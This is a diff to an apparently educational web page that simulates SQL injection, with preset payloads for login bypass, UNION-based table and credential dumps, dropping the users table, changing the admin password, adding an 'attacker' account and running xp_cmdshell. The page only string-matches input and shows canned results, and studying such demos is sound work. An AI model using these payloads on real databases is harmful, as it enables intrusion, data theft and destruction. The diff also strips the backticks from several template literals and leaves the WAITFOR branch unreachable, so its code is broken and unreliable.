@@ -221,6 +221,37 @@
     .breach-effect {
       animation: breach 0.5s 3;
     }
+    
+    /* === TABS === */
+    .attack-tabs {
+      display: flex;
+      margin-bottom: 15px;
+      border-bottom: 1px solid var(--matrix-green);
+    }
+    
+    .tab-btn {
+      background: transparent;
+      border: none;
+      border-bottom: 2px solid transparent;
+      color: var(--cyber-blue);
+      padding: 8px 15px;
+      cursor: pointer;
+      font-family: 'Share Tech Mono', monospace;
+      transition: all 0.3s;
+    }
+    
+    .tab-btn.active {
+      border-bottom: 2px solid var(--hacker-green);
+      color: var(--hacker-green);
+    }
+    
+    .tab-content {
+      display: none;
+    }
+    
+    .tab-content.active {
+      display: block;
+    }
   </style>
 </head>
 <body>
@@ -252,16 +283,43 @@
           <input type="text" id="username" class="form-input" placeholder="USERNAME">
           <input type="password" id="password" class="form-input" placeholder="PASSWORD">
           
-          <div class="attack-buttons">
-            <button class="attack-btn" id="basicBypassBtn">Basic Bypass</button>
-            <button class="attack-btn" id="alwaysTrueBtn">Always True</button>
-            <button class="attack-btn" id="commentAttackBtn">Comment Attack</button>
-            <button class="attack-btn" id="unionAttackBtn">Union Attack</button>
-            <button class="attack-btn" id="timeBasedBtn">Time-Based</button>
-            <button class="attack-btn" id="resetBtn">Reset Form</button>
+          <div class="attack-tabs">
+            <button class="tab-btn active" onclick="openTab('login-bypass')">Login Bypass</button>
+            <button class="tab-btn" onclick="openTab('data-extraction')">Data Extraction</button>
+            <button class="tab-btn" onclick="openTab('db-exploitation')">DB Exploitation</button>
           </div>
           
-          <button class="execute-btn" id="executeBtn">EXECUTE QUERY</button>
+          <div id="login-bypass" class="tab-content active">
+            <div class="attack-buttons">
+              <button class="attack-btn" onclick="loadAttack('1=1')">Basic Bypass</button>
+              <button class="attack-btn" onclick="loadAttack('\' OR \'1\'=\'1')">Always True</button>
+              <button class="attack-btn" onclick="loadAttack('admin\' --')">Comment Attack</button>
+              <button class="attack-btn" onclick="loadAttack('\' OR 1=1 --')">OR Condition</button>
+              <button class="attack-btn" onclick="loadAttack('admin\' OR \'1\'=\'1\' --')">Admin Bypass</button>
+            </div>
+          </div>
+          
+          <div id="data-extraction" class="tab-content">
+            <div class="attack-buttons">
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT 1,2,3 --')">Basic Union</button>
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT table_name,2,3 FROM information_schema.tables --')">Table Names</button>
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name=\'users\' --')">Column Names</button>
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT CONCAT(username,\':\',password),2,3 FROM users --')">Data Dump</button>
+              <button class="attack-btn" onclick="loadAttack('\' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables)) --')">Error-Based</button>
+            </div>
+          </div>
+          
+          <div id="db-exploitation" class="tab-content">
+            <div class="attack-buttons">
+              <button class="attack-btn" onclick="loadAttack('\'; DROP TABLE users --')">Table Deletion</button>
+              <button class="attack-btn" onclick="loadAttack('\'; UPDATE users SET password=\'hacked\' WHERE username=\'admin\' --')">Data Manipulation</button>
+              <button class="attack-btn" onclick="loadAttack('\'; INSERT INTO users (username, password) VALUES (\'attacker\', \'pwned\') --')">Add User</button>
+              <button class="attack-btn" onclick="loadAttack('\'; EXEC xp_cmdshell(\'calc.exe\') --')">Command Execution</button>
+              <button class="attack-btn" onclick="loadAttack('\'; WAITFOR DELAY \'0:0:5\' --')">Time Delay</button>
+            </div>
+          </div>
+          
+          <button class="execute-btn" onclick="executeQuery()">EXECUTE QUERY</button>
         </div>
         
         <div class="response-area" id="responseArea">
@@ -294,9 +352,9 @@
         const delay = Math.random() * 5;
         const opacity = 0.1 + Math.random() * 0.3;
         
-        digit.style.left = `${left}%`;
-        digit.style.animationDuration = `${animationDuration}s`;
-        digit.style.animationDelay = `${delay}s`;
+        digit.style.left = ${left}%;
+        digit.style.animationDuration = ${animationDuration}s;
+        digit.style.animationDelay = ${delay}s;
         digit.style.opacity = opacity;
         
         // Change digits periodically
@@ -308,11 +366,28 @@
       }
     }
 
+    // Switch between attack tabs
+    function openTab(tabId) {
+      // Hide all tab contents
+      document.querySelectorAll('.tab-content').forEach(tab => {
+        tab.classList.remove('active');
+      });
+      
+      // Deactivate all tab buttons
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.remove('active');
+      });
+      
+      // Activate selected tab
+      document.getElementById(tabId).classList.add('active');
+      event.currentTarget.classList.add('active');
+    }
+
     // Load predefined attack
-    function loadAttack(attack, description) {
+    function loadAttack(attack) {
       document.getElementById('username').value = attack;
       document.getElementById('password').value = 'password';
-      addTerminalLine(`> Loaded attack pattern: ${description || attack}`);
+      addTerminalLine(> Loaded attack pattern: ${attack});
     }
 
     // Execute the SQL query simulation
@@ -320,60 +395,152 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
       
-      addTerminalLine(`> Executing: SELECT * FROM users WHERE username='${username}' AND password='${password}'`);
+      addTerminalLine(> Executing: SELECT * FROM users WHERE username='${username}' AND password='${password}');
       
       // Simulate different responses based on input
       let response = "";
       const responseArea = document.getElementById('responseContent');
       const terminal = document.getElementById('terminalOutput');
       
-      if (username.includes("' OR '1'='1") || username.includes("' --") || 
-          username.includes("1=1") || username.includes("UNION") ||
-          username.includes("SLEEP")) {
-        // Successful injection
+      // Check for different types of attacks
+      if (username.includes("' OR '1'='1") || 
+          username.includes("' --") || 
+          username.includes("1=1") ||
+          username.includes("' OR 1=1 --")) {
+        // Login bypass attacks
         response = `
           <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
           <span style="color: var(--hacker-green)">Query executed successfully!</span><br>
-          <span style="color: var(--cyber-blue)">Returned records:</span><br><br>
-          ID: 1 | Username: admin | Password: 5f4dcc3b5aa765d61d8327deb882cf99 (password)<br>
-          ID: 2 | Username: testuser | Password: 5f4dcc3b5aa765d61d8327deb882cf99 (password)<br>
-          ID: 3 | Username: guest | Password: 098f6bcd4621d373cade4e832627b4f6 (test)<br>
-          <br>
-          <span style="color: var(--cyber-blue)">Database schema exposed:</span><br>
-          Table: users (id, username, password, email, role)<br>
-          Table: products (id, name, price, description)
+          <span style="color: var(--cyber-blue)">Returned all user records:</span><br><br>
+          ID: 1 | Username: admin | Password: S3cr3tP@ss<br>
+          ID: 2 | Username: user1 | Password: password123<br>
+          ID: 3 | Username: test | Password: test123<br>
         `;
-        
-        // Add breach effect
-        document.querySelector('.cyber-terminal').classList.add('breach-effect');
-        setTimeout(() => {
-          document.querySelector('.cyber-terminal').classList.remove('breach-effect');
-        }, 1500);
-        
-        addTerminalLine(`> <span style="color: var(--warning-red)">SECURITY BREACH!</span> Database records exposed`);
-      } else if (username === 'admin' && password === 'password') {
+        addTerminalLine(> <span style="color: var(--warning-red)">SECURITY BREACH!</span> Database records exposed);
+      } 
+      else if (username.includes("UNION SELECT")) {
+        // Data extraction attacks
+        if (username.includes("information_schema.tables")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">Database tables exposed:</span><br><br>
+            users<br>
+            products<br>
+            orders<br>
+            customers<br>
+            system_logs<br>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">DATABASE STRUCTURE LEAKED!</span> Table names extracted);
+        }
+        else if (username.includes("information_schema.columns")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">Table columns exposed:</span><br><br>
+            users.id<br>
+            users.username<br>
+            users.password<br>
+            users.email<br>
+            users.is_admin<br>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">DATABASE STRUCTURE LEAKED!</span> Column names extracted);
+        }
+        else if (username.includes("FROM users")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">User credentials dumped:</span><br><br>
+            admin:S3cr3tP@ss<br>
+            user1:password123<br>
+            test:test123<br>
+            backup:Backup@123<br>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">CRITICAL BREACH!</span> User credentials extracted);
+        }
+        else {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">UNION attack successful</span><br>
+            Columns count: 3<br>
+            Vulnerable columns: 1, 2, 3<br>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">INJECTION SUCCESSFUL!</span> UNION attack worked);
+        }
+      }
+      else if (username.includes("DROP TABLE") || 
+               username.includes("UPDATE users") || 
+               username.includes("INSERT INTO users") ||
+               username.includes("xp_cmdshell")) {
+        // Database exploitation attacks
+        if (username.includes("DROP TABLE")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">Table dropped successfully!</span><br>
+            The 'users' table has been deleted from the database.<br>
+            <span style="color: var(--warning-red)">All user data lost!</span>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">DESTRUCTIVE ATTACK!</span> Table dropped);
+        }
+        else if (username.includes("UPDATE users")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">Data modified successfully!</span><br>
+            Admin password changed to 'hacked'.<br>
+            <span style="color: var(--warning-red)">System compromised!</span>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">DATA MODIFIED!</span> Admin credentials changed);
+        }
+        else if (username.includes("INSERT INTO users")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">New user created!</span><br>
+            Added user 'attacker' with password 'pwned'.<br>
+            <span style="color: var(--warning-red)">Backdoor installed!</span>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">UNAUTHORIZED ACCESS!</span> New user added);
+        }
+        else if (username.includes("xp_cmdshell")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">Command executed!</span><br>
+            System command 'calc.exe' launched on server.<br>
+            <span style="color: var(--warning-red)">RCE achieved!</span>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">REMOTE CODE EXECUTION!</span> Calculator opened on server);
+        }
+        else if (username.includes("WAITFOR DELAY")) {
+          response = `
+            <span style="color: var(--warning-red)">[!] SQL INJECTION DETECTED</span><br><br>
+            <span style="color: var(--hacker-green)">Time delay detected!</span><br>
+            The server responded after 5 seconds delay.<br>
+            <span style="color: var(--warning-red)">Blind SQLi possible!</span>
+          `;
+          addTerminalLine(> <span style="color: var(--warning-red)">BLIND INJECTION!</span> Time delay detected);
+        }
+      }
+      else if (username === 'admin' && password === 'password') {
         // Normal login
         response = `
           <span style="color: var(--hacker-green)">Login successful!</span><br>
-          Welcome back, admin. Your last login was 2025-05-10 14:30:22 UTC
+          Welcome back, admin.
         `;
-        addTerminalLine(`> Authentication successful for user: admin`);
-      } else if (username === '' || password === '') {
-        // Empty fields
-        response = `
-          <span style="color: var(--warning-red)">Error:</span> Username and password cannot be empty
-        `;
-        addTerminalLine(`> Empty credentials provided`);
+        addTerminalLine(> Authentication successful for user: admin);
       } else {
         // Failed login
         response = `
           <span style="color: var(--warning-red)">Login failed!</span><br>
           Invalid username or password.
         `;
-        addTerminalLine(`> Authentication failed for provided credentials`);
+        addTerminalLine(> Authentication failed for provided credentials);
       }
       
       responseArea.innerHTML = response;
+      
+      // Add breach effect for any successful injection
+      if (response.includes("[!] SQL INJECTION DETECTED")) {
+        document.querySelector('.cyber-terminal').classList.add('breach-effect');
+        setTimeout(() => {
+          document.querySelector('.cyber-terminal').classList.remove('breach-effect');
+        }, 1500);
+      }
       
       // Auto-scroll terminal
       terminal.scrollTop = terminal.scrollHeight;
@@ -384,55 +551,14 @@
       const terminal = document.getElementById('terminalOutput');
       const line = document.createElement('div');
       line.className = 'terminal-line';
-      line.innerHTML = `> ${text}`;
+      line.innerHTML = > ${text};
       terminal.appendChild(line);
-      terminal.scrollTop = terminal.scrollHeight;
-    }
-
-    // Reset form
-    function resetForm() {
-      document.getElementById('username').value = '';
-      document.getElementById('password').value = '';
-      document.getElementById('responseContent').innerHTML = 'Awaiting query execution...';
-      addTerminalLine('Form reset to default state');
     }
 
     // Initialize on load
-    document.addEventListener('DOMContentLoaded', () => {
+    window.addEventListener('load', () => {
       createBinaryRain();
       
-      // Button event listeners
-      document.getElementById('basicBypassBtn').addEventListener('click', () => {
-        loadAttack("1=1", "Basic Bypass (1=1)");
-      });
-      
-      document.getElementById('alwaysTrueBtn').addEventListener('click', () => {
-        loadAttack("' OR '1'='1", "Always True Condition");
-      });
-      
-      document.getElementById('commentAttackBtn').addEventListener('click', () => {
-        loadAttack("admin' --", "Comment Attack (admin' --)");
-      });
-      
-      document.getElementById('unionAttackBtn').addEventListener('click', () => {
-        loadAttack("' UNION SELECT 1,username,password FROM users--", "UNION Attack");
-      });
-      
-      document.getElementById('timeBasedBtn').addEventListener('click', () => {
-        loadAttack("' OR IF(1=1,SLEEP(5),0)--", "Time-Based Blind SQLi");
-      });
-      
-      document.getElementById('resetBtn').addEventListener('click', resetForm);
-      
-      document.getElementById('executeBtn').addEventListener('click', executeQuery);
-      
-      // Allow pressing Enter to execute query
-      document.getElementById('password').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-          executeQuery();
-        }
-      });
-
       // Add initial terminal lines with delay
       setTimeout(() => {
         addTerminalLine("System ready");
